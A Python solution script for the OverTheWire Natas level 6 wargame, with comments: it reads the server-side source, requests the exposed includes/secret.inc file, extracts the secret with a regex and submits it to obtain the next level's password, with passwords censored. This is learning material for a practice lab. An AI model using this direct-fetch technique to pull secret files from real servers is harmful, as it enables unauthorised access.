'''
From this challenge and forward you can read the source code that runs in the server, not just the source code of the page.

'''
import requests
import re

username = "natas6"
password = "<censored>"
url = "http://%s.natas.labs.overthewire.org/"  % username
source = "index-source.html"

session = requests.Session()
# GET request to the front page.
response = session.get(url,auth=(username,password))
print(response.text)
print("="*50)

# GET request to the index-source.
response = session.get(url+source,auth=(username,password))
print(response.text)
print("="*50)

'''
From the index-source we can see the next part of code:

<?
include "includes/secret.inc";
    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
			print "Access granted. The password for natas7 is <censored>";
		} else {
			print "Wrong secret";
		}
    }
?>
That code reads the "secret.inc" file and compares the input of the user with the content of the that file.
So we have to read the file to get the right code.
'''

# Reading the right code from the file.
secret = "includes/secret.inc"
response = session.get(url+secret,auth=(username,password))
print(response.text)
print("="*50)

sec_pass = re.findall(r"[A-Z]{19}",response.text)[0]

# Doing a POST request to the server with the right password that I got from the last step. The password is inside the "sec_pass" variable
response = session.post(url,data={"secret":sec_pass,"submit":"submit"},auth=(username,password))
pageContent = response.text
print(pageContent)
print("="*50)

# Just Code Printing
code = re.findall('The password for natas7 is (.*)', pageContent)[0]
print("The password for the next level is: " + code)
